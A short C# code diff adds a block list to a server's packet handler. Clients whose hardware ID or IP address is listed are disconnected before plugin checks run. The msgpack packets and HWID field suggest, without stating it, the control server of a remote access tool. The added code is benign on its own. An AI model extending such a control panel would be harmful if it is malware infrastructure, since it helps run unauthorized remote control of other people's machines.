@@ -13,6 +13,23 @@ namespace Server.Handle_Packet
         {
             try
             {
+                lock (Settings.LockBlocked)
+                {
+                    if (Settings.Blocked.Count > 0)
+                    {
+                        if (Settings.Blocked.Contains(unpack_msgpack.ForcePathObject("HWID").AsString))
+                        {
+                            client.Disconnected();
+                            return;
+                        }
+                        else if (Settings.Blocked.Contains(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]))
+                        {
+                            client.Disconnected();
+                            return;
+                        }
+                    }
+                }
+
                 try
                 {
                     client.CheckPlugin();
